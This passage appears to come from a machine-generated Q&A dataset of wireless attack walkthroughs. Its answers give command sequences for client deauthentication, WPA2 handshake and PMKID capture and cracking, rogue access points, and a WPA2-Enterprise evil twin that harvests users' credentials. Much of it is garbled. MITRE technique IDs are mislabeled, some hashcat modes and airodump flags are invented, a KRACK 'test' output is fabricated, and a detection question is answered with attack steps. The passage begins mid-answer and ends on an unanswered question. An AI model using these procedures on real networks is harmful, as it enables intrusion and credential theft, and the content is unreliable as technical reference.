sudo aireplay-ng -0 10 -a <target_BSSID> wlan0mon
```

**Step 3 — Capture packets:**
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> -w capture --bssid <target_BSSID> wlan0mon
```

**Artifacts:**
- Captured file (e.g., `capture-01.cap`).
- Network monitoring: increased packet count during reassociation.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: What is a PMKID attack, and how can it be used in WPA2 networks?
A: **Technique: Pre-Shared Key Identifier (PMKID) Attack — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture PMKIDs:**
```bash
# Start capturing packets from the target network to capture PMKIDs
sudo airodump-ng -c <channel> -w capture --bssid <target_BSSID> wlan0mon
```

**Step 3 — Crack PMKID:**
```bash
# Use hashcat to crack the captured PMKIDs
hashcat -m 16800 capture-01.cap wordlist.txt
```

**Artifacts:**
- Captured file (e.g., `capture-01.cap`).
- Cracked key from hashcat output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture Dragonblood packets:**
```bash
# Start capturing packets from the target network to capture Dragonblood packets
sudo airodump-ng -c <channel> -w capture --bssid <target_BSSID> wlan0mon
```

**Step 3 — Crack Dragonblood:**
```bash
# Use hashcat to crack the captured Dragonblood packets
hashcat -m 18224 capture-01.cap wordlist.txt
```

**Artifacts:**
- Captured file (e.g., `capture-01.cap`).
- Cracked key from hashcat output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: Describe a scenario where you might use BLE attacks during a penetration test.
A: **Technique: Bluetooth Low Energy (BLE) Attacks — T1590.001**

**Scenario:** You are testing an IoT device that uses BLE for communication.

**Step 1 — Scan for BLE devices:**
```bash
# Scan for nearby BLE devices
sudo hcitool lescan
```

**Step 2 — Connect to the target BLE device:**
```bash
# Connect to the target BLE device using its MAC address
gatttool -b <target_MAC> --interactive
```

**Step 3 — Perform a service discovery:**
```bash
# Discover services and characteristics on the connected device
primary
characteristics
```

**Artifacts:**
- List of nearby BLE devices.
- Services and characteristics from the target device.

**Cleanup:**
```bash
# Exit gatttool interactive mode
exit
```

=== BATCH 7 RETRY 0 ===
===PAIR===
Q: How can I capture WPA2 handshakes for offline cracking?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001 (Offline Cracking)**

**Step 1 \u2014 Put interface in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing packets:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel> -w capture
```

**Step 3 \u2014 Deauthenticate clients to force reconnection:**
```bash
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Captured files (e.g., `capture-01.cap`)
- Wireshark can be used to verify the presence of handshakes.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good way to detect rogue access points in a network?
A: **Technique: Wireless Network Reconnaissance \u2014 T1590.001 (Rogue AP Detection)**

**Step 1 \u2014 Scan for nearby networks:**
```bash
sudo iwlist wlan0 scan | grep -e "SSID" -e "Address"
```

**Step 2 \u2014 Compare with known SSIDs and BSSIDs:**
```bash
# Example comparison script
cat > compare_networks.sh << 'EOF'
known_ssids=("Network1" "Network2")
unknown=()
while read -r line; do
    if [[ $line == *SSID:* ]]; then
        ssid=$(echo $line | awk '{print substr($0, index($0,$3))}')
        if [[ ! "${known_ssids[@]}" =~ "$ssid" ]]; then
            unknown+=("$ssid")
        fi
    elif [[ $line == *Address:* ]]; then
        bssid=$(echo $line | awk '{print substr($0, index($0,$2))}')
        echo "SSID: $ssid, BSSID: $bssid"
    fi
done < <(sudo iwlist wlan0 scan)
EOF

sudo bash compare_networks.sh
```

**Expected Artifacts/Telemetry:**
- List of unknown SSIDs and their BSSIDs.
- Potential rogue access points noted.

**Cleanup:**
```bash
rm compare_networks.sh
```
===PAIR===
Q: How can I perform a deauthentication attack to disrupt wireless clients?
A: **Technique: WPA/WPA2 Deauthentication Attack \u2014 T1595.001 (Disruption)**

**Step 1 \u2014 Put interface in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start deauthentication attack:**
```bash
sudo aireplay-ng -0 50 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Clients disconnecting and reconnecting to the network.
- Network monitoring tools may show increased activity.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: Can you explain how PMKID attacks work and provide an example command?
A: **Technique: PMKID Attack \u2014 T1595.001 (Offline Cracking)**

**Explanation:** PMKID (Pairwise Master Key Identifier) is a value derived from the 4-way handshake that can be captured without waiting for the full handshake. It can be used to crack WPA2 passwords offline.

**Example Command:**
```bash
# Start capturing packets with airodump-ng
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel> -w pmkid_capture

# Use hcxpcapngtool to extract PMKIDs from the capture file
hcxpcapngtool -z pmkid.hc2x pmkid_capture-01.cap
```

**Expected Artifacts/Telemetry:**
- `pmkid.hc2x` file containing extracted PMKIDs.
- Cracking can be done using hashcat:
  ```bash
  hashcat -m 5800 pmkid.hc2x wordlist.txt
  ```

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid_capture*
```
===PAIR===
Q: What is a KRACK attack, and how can I check if my network is vulnerable?
A: **Technique: KRACK Attack \u2014 T1595.001 (Key Reinstallation)**

**Explanation:** KRACK (Key Reinstallation Attacks) occur when the same key is reinstalled on a device, potentially leading to data leakage.

**Check for Vulnerability:**
```bash
# Use aireplay-ng to check if the network is vulnerable
sudo aireplay-ng --test wlan0mon -a <target_BSSID>
```

**Expected Artifacts/Telemetry:**
- Output indicating whether the network is vulnerable to KRACK.
- Example of a vulnerable output:
  ```
  The station supports WPA2 and is using AES. It's vulnerable to the Key Reinstallation Attack (KRACK).
  ```

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform BLE (Bluetooth Low Energy) attacks during a penetration test?
A: **Technique: Bluetooth Low Energy (BLE) Attacks \u2014 T1590.001 (BLE Scanning and Interference)**

**Step 1 \u2014 Scan for BLE devices:**
```bash
sudo hcitool lescan
```

**Step 2 \u2014 Connect to a target device:**
```bash
sudo gatttool -b <target_MAC> --interactive
# Then, within the interactive mode:
connect
```

**Step 3 \u2014 Perform an attack (e.g., service discovery):**
```bash
services
```

**Expected Artifacts/Telemetry:**
- List of BLE devices and their MAC addresses.
- Services discovered on the target device.

**Cleanup:**
No specific cleanup steps are necessary, but you can reset the Bluetooth adapter if needed:
```bash
sudo hciconfig hci0 down && sudo hciconfig hci0 up
```
These pairs cover different subtopics within Wireless Attacks and include MITRE IDs as requested.

=== BATCH 8 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking during a penetration test?
A: **Technique: WPA2 Handshake Capture and Offline Cracking — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 — Capture Handshake:**
```bash
# Start capturing packets to find the handshake
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

**Step 3 — Deauthenticate Client (optional):**
```bash
# Force client to re-authenticate and capture new handshake
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Crack Handshake:**
```bash
# Use a wordlist to crack the captured handshake
aircrack-ng capture-01.cap -w wordlist.txt
```

**Artifacts:**
- Captured .cap files in the current directory.
- Cracked passwords listed by `aircrack-ng`.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is an effective way to set up a rogue access point during testing?
A: **Technique: Rogue Access Point — T1590.001**

**Step 1 — Configure Wireless Adapter:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Set up the interface for the rogue AP
sudo iwconfig wlan0mon essid "FreeWiFi" channel 6
```

**Step 2 — Start DHCP Server:**
```bash
# Install and configure dnsmasq as DHCP server
sudo apt install dnsmasq
cat > /etc/dnsmasq.conf << 'EOF'
interface=wlan0mon
dhcp-range=192.168.1.10,192.168.1.100,12h
EOF

# Restart dnsmasq
sudo systemctl restart dnsmasq
```

**Step 3 — Start the Rogue AP:**
```bash
# Use hostapd to start the access point
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=secretwifi
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/hostapd.conf
```

**Artifacts:**
- New DHCP clients assigned IP addresses in the range 192.168.1.10 to 192.168.1.100.
- Clients connected to "FreeWiFi" with the password "secretwifi".

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd
rm /tmp/hostapd.conf
```
===PAIR===
Q: How can I perform a WPA2 Enterprise evil twin attack?
A: **Technique: Evil Twin Attack (WPA2 Enterprise) — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2e
# Note: BSSID, channel, ESSID of the target Enterprise network
```

**Step 2 — Set up fake RADIUS server:**
```bash
# Install hostapd-wpe (Wireless Pawn Edition)
sudo apt install hostapd-wpe

# Configure hostapd-wpe
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dh.pem
EOF
```

**Step 3 — Start the evil twin AP:**
```bash
# Start access point
sudo hostapd-wpe /tmp/hostapd-wpe.conf

# Captured credentials are logged to:
# /etc/hostapd-wpe/hostapd-wpe.log
```

**Step 4 — Deauthenticate legitimate clients:**
```bash
# Force clients to reconnect to evil twin
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Wireless IDS: multiple APs with same ESSID (BSSID mismatch)
- RADIUS logs: authentication attempts from unknown NAS
- Network monitoring: channel change events, signal strength anomalies
- Client logs: certificate warnings (if checking)

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd-wpe
rm /tmp/hostapd-wpe.conf
```
===PAIR===
Q: How can I use KRACK to force a client to retransmit the same data?
A: **Technique: Key Reinstallation Attack (KRACK) — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 — Deauthenticate Client:**
```bash
# Force client to re-authenticate and capture new handshake
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Capture Packets:**
```bash
# Start capturing packets to find the retransmitted data
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

**Artifacts:**
- Captured .cap files in the current directory.
- Retransmitted packets visible in the capture.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good way to perform wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Reconnaissance and Mapping — T1546**

**Step 1 — Scan for Networks:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover all networks
sudo airodump-ng wlan0mon
```

**Step 2 — Map the Networks:**
```bash
# Use kismet to map and analyze the networks
sudo kismet -c wlan0mon
```

**Artifacts:**
- `kismet.netxml` file containing network information.
- Graphical interface showing signal strength, noise levels, and other metrics.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo pkill kismet
```
===PAIR===
Q: How can I perform a PMKID attack for WPA2?
A: **Technique: PMKID Attack — T1590.001**

**Step 1 — Put Adapter in Monitor Mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 — Capture PMKIDs:**
```bash
# Start capturing packets to find the PMKIDs
sudo airodump-ng --bssid <BSSID> -c <channel> --pmkid -w capture wlan0mon
```

**Step 3 — Crack Captured PMKIDs:**
```bash
# Use hashcat to crack the captured PMKIDs
hashcat -m 16800 capture-01.kismet.csv wordlist.txt
```

**Artifacts:**
- Captured .kismet.csv files in the current directory.
- Cracked passwords listed by `hashcat`.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

=== BATCH 9 RETRY 0 ===
===PAIR===
Q: How can I capture a WPA2 handshake to crack later?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing packets on the target network:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
# Note: Look for the "Data" column to see if clients are sending data.
```

**Step 3 \u2014 Deauthenticate a client to force a new handshake:**
```bash
sudo aireplay-ng -0 2 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Handshake saved as `*.cap` file.
- Network monitoring tools may show increased activity.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: What is a good way to detect rogue access points in the network?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001**

**Step 1 \u2014 Scan for all wireless networks:**
```bash
sudo nmap -sn --script broadcast-dns-sd-probe,arp-scan 192.168.1.0/24
```

**Step 2 \u2014 Use `kismet` to capture detailed network information:**
```bash
sudo kismet
# Look for unusual SSIDs or BSSIDs.
```

**Expected Artifacts/Telemetry:**
- Network maps with SSID, BSSID, and signal strength.
- Potential anomalies in the map.

**Cleanup:**
```bash
sudo pkill kismet
```
===PAIR===
Q: How can I perform a WPA2 Enterprise evil twin attack?
A: **Technique: Evil Twin Attack (WPA2 Enterprise) \u2014 T1590.001**

**Step 1 \u2014 Gather network info:**
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --encrypt wpa2e
# Note: BSSID, channel, ESSID of target Enterprise network.
```

**Step 2 \u2014 Set up fake RADIUS server:**
```bash
sudo apt install hostapd-wpe
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dh.pem
EOF
```

**Step 3 \u2014 Start the evil twin AP:**
```bash
sudo hostapd-wpe /tmp/hostapd-wpe.conf
# Captured credentials are logged to /etc/hostapd-wpe/hostapd-wpe.log.
```

**Expected Artifacts/Telemetry:**
- Multiple APs with same ESSID (BSSID mismatch).
- RADIUS logs: authentication attempts from unknown NAS.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd-wpe
rm /tmp/hostapd-wpe.conf
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing packets on the target network:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
# Look for Dragonblood frames (type=3, subtype=16).
```

**Step 3 \u2014 Deauthenticate a client to force a new handshake:**
```bash
sudo aireplay-ng -0 2 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Dragonblood frames captured in the .cap file.
- Network monitoring tools may show increased activity.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: What is a good way to detect KRACK attacks?
A: **Technique: KRACK Attack Detection \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing packets on the target network:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
# Look for retransmitted data frames (type=0, subtype=0).
```

**Expected Artifacts/Telemetry:**
- Retransmitted data frames indicating potential KRACK.
- Network monitoring tools may show packet loss or anomalies.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform a PMKID attack for WPA2?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing packets on the target network:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
# Look for PMKID values in the captured data.
```

**Expected Artifacts/Telemetry:**
- PMKIDs saved as `*.cap` file.
- Network monitoring tools may show increased activity.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```

=== BATCH 10 RETRY 0 ===
===PAIR===
Q: How do I perform a WPA2 handshake capture and offline cracking?
A: **Technique: WPA2 Handshake Capture and Offline Cracking — T1590.001 (Offline Cracking)**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture the handshake:**
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 — Deauthenticate clients to force re-authentication:**
```bash
# Force clients to reconnect and send new handshake data
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Stop the capture and crack the password:**
```bash
# Kill airodump-ng process
killall airodump-ng

# Crack the captured WPA2 handshake using John the Ripper or Hashcat
john --wordlist=wordlist.txt capture-01.cap
# Or
hashcat -m 2500 capture-01.cap wordlist.txt
```

**Artifacts:**
- Captured .cap file with WPA2 handshake data.
- Cracked password in the output of John or Hashcat.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: Can you explain how to set up a rogue access point?
A: **Technique: Rogue Access Point Setup — T1590.001 (Rogue AP)**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Configure the rogue AP:**
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq

# Configure hostapd
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Configure dnsmasq for DHCP
cat > /etc/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.1.50,192.168.1.100,12h
EOF
```

**Step 3 — Start the rogue AP:**
```bash
# Start hostapd and dnsmasq
sudo systemctl start hostapd
sudo systemctl start dnsmasq

# Verify that the AP is running
iwconfig wlan0
```

**Artifacts:**
- New network (RogueWiFi) visible to wireless devices.
- Captured DHCP requests from clients.

**Cleanup:**
```bash
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
rm /etc/hostapd/hostapd.conf
rm /etc/dnsmasq.conf
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack — T1590.001 (Dragonblood)**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target WPA3 network
```

**Step 2 — Capture the Dragonblood frame:**
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w dragonblood wlan0mon &
```

**Step 3 — Deauthenticate clients to force re-authentication:**
```bash
# Force clients to reconnect and send new Dragonblood frame data
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Stop the capture and crack the password:**
```bash
# Kill airodump-ng process
killall airodump-ng

# Crack the captured WPA3 Dragonblood frame using Hashcat
hashcat -m 16800 dragonblood-01.cap wordlist.txt
```

**Artifacts:**
- Captured .cap file with WPA3 Dragonblood frame data.
- Cracked password in the output of Hashcat.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm dragonblood*
```
===PAIR===
Q: What is a KRACK attack, and how can I perform one?
A: **Technique: Key Reinstallation Attack (KRACK) — T1595.001 (KRACK)**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Deauthenticate clients to trigger rekeying:**
```bash
# Force clients to reconnect and send new handshake data
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Capture the rekeyed packets:**
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w krack_capture wlan0mon &
```

**Step 4 — Analyze and exploit the captured data:**
```bash
# Kill airodump-ng process
killall airodump-ng

# Use tools like Aircrack-ng or Wireshark to analyze the rekeyed packets
aircrack-ng krack_capture-01.cap
```

**Artifacts:**
- Captured .cap file with rekeyed packets.
- Analyzed data in the output of Aircrack-ng.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm krack_capture*
```
===PAIR===
Q: How do I perform a PMKID attack for WPA2?
A: **Technique: PMKID Attack — T1590.001 (PMKID)**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture the PMKID:**
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> --bssid <BSSID> -w pmkid wlan0mon &
```

**Step 3 — Deauthenticate clients to force re-authentication:**
```bash
# Force clients to reconnect and send new PMKID data
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Stop the capture and crack the password:**
```bash
# Kill airodump-ng process
killall airodump-ng

# Crack the captured PMKID using Hashcat
hashcat -m 16800 pmkid-01.cap wordlist.txt
```

**Artifacts:**
- Captured .cap file with PMKID data.
- Cracked password in the output of Hashcat.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid*
```
===PAIR===
Q: How can I perform wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Reconnaissance and Mapping — T1546 (Network Discovery)**

**Step 1 — Scan for networks:**
```bash
# Use airodump-ng to scan all networks
sudo airodump-ng wlan0mon
```

**Step 2 — Identify the target network:**
- Note down the BSSID, channel, and ESSID of the target network.

**Step 3 — Perform detailed scanning:**
```bash
# Scan for clients connected to the target network
sudo airodump-ng --bssid <BSSID> -c <channel> wlan0mon
```

**Step 4 — Map the network topology:**
- Use tools like NetStumbler or Kismet for more detailed mapping and analysis.

**Artifacts:**
- List of all visible networks with BSSID, channel, ESSID, and signal strength.
- Clients connected to the target network with MAC addresses and signal strengths.

**Cleanup:**
```bash
# No additional cleanup needed for airodump-ng scans.
```

=== BATCH 11 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking for a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture Handshake:**  
```bash
# Start capturing packets
sudo airodump-ng wlan0mon -c <channel> --bssid <BSSID> -w capture

# Deauthenticate a client to force re-authentication and capture the handshake
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Crack Handshake:**  
```bash
# Convert .cap file to .hccapx (if needed)
aircrack-ng capture-01.cap

# Use john the ripper or hashcat to crack the password
john --wordlist=rockyou.txt capture-01.hccapx
# Or with hashcat:
hashcat -m 2500 capture-01.hccapx rockyou.txt
```

**Artifacts:**  
- Captured .cap file containing handshake packets.
- Cracked password stored in the output of john or hashcat.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a method to detect and mitigate Evil Twin attacks on WPA2 Enterprise networks?
A: **Technique: Evil Twin Detection and Mitigation \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target Enterprise network
```

**Step 2 \u2014 Set up fake RADIUS server:**  
```bash
# Install hostapd-wpe (Wireless Pawn Edition)
sudo apt install hostapd-wpe

# Configure hostapd-wpe
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=CorporateWiFi
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dh.pem
EOF
```

**Step 3 \u2014 Start the evil twin AP:**  
```bash
# Start access point
sudo hostapd-wpe /tmp/hostapd-wpe.conf

# Captured credentials are logged to:
# /etc/hostapd-wpe/hostapd-wpe.log
```

**Step 4 \u2014 Deauthenticate legitimate clients:**  
```bash
# Force clients to reconnect to evil twin
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**  
- Wireless IDS: multiple APs with same ESSID (BSSID mismatch)
- RADIUS logs: authentication attempts from unknown NAS
- Network monitoring: channel change events, signal strength anomalies
- Client logs: certificate warnings (if checking)

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd-wpe
rm /tmp/hostapd-wpe.conf
```
===PAIR===
Q: How can I use KRACK attacks to compromise a WPA2 network?
A: **Technique: Key Reinstallation Attacks (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Deauthentication:**  
```bash
# Deauthenticate a client to force re-authentication
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Capture Packets:**  
```bash
# Start capturing packets
sudo tcpdump -i wlan0mon -w capture.pcapng
```

**Step 4 \u2014 Analyze with Wireshark:**  
- Open `capture.pcapng` in Wireshark.
- Filter for the target BSSID and look for retransmitted data frames.
- Check if the same key is being used multiple times.

**Artifacts:**  
- Captured .pcapng file containing packets.
- Wireshark analysis showing potential KRACK vulnerabilities.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture.pcapng
```
===PAIR===
Q: What are some methods to perform wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001**

**Step 1 \u2014 Scan for Networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform a basic scan
sudo iwlist wlan0mon scanning | grep -i "ssid\|encryption"
```

**Step 2 \u2014 Detailed Network Mapping:**  
```bash
# Use airodump-ng for more detailed information
sudo airodump-ng wlan0mon --write=network_map

# After some time, stop the scan and analyze the output.
```

**Artifacts:**  
- Captured .csv or .kismet files containing network details (SSID, BSSID, channel, encryption type).
- Visual maps generated from tools like Kismet or Wireshark.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm network_map*
```
===PAIR===
Q: How can I perform a PMKID attack for WPA2 networks?
A: **Technique: Pre-shared Key Identifier (PMKID) Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets with hcxpcapngtool
hcxpcapngtool -o output.pcapng wlan0mon
```

**Step 3 \u2014 Extract and Crack PMKIDs:**  
```bash
# Convert .pcapng to .kck or .pmkid file
hcxpcapngtool -z output.kck output.pcapng

# Use hashcat to crack the PMKIDs
hashcat -m 16800 output.kck wordlist.txt
```

**Artifacts:**  
- Captured .pcapng file containing packets.
- Extracted .kck or .pmkid file with PMKIDs.
- Cracked PSKs stored in hashcat output.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm output.pcapng output.kck
```
===PAIR===
Q: What is a Bluetooth Low Energy (BLE) attack, and how can I perform one?
